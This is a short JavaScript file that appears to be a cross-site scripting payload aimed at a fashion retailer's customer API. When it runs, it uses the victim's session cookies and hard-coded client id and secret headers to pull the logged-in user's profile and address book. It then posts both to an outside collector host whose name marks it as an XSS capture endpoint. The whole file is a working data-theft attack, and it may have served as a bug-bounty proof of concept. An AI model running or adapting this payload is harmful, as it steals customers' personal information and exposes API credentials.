async function sendLVData() {
  const headers = {
    credentials: 'include',
    headers: {
      'Client_id': '607e3016889f431fb8020693311016c9',
      'Client_secret': '60bbcdcD722D411B88cBb72C8246a22F'
    }
  };

  const addressRes = await fetch('https://api.louisvuitton.com/eco-eu/lvcom-client-eapi/v1/clients/addressbook?locale=fra-fr', headers);
  const addressData = await addressRes.json();

  const profileRes = await fetch('https://api.louisvuitton.com/eco-eu/lvcom-client-eapi/v1/clients/profile?locale=eng-e1', headers);
  const profileData = await profileRes.json();

  const payload = {
    profile: profileData,
    addressbook: addressData
  };

  await fetch('https://dindindin-xss-lv.free.beeceptor.com/LV-PII', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });
}

sendLVData();
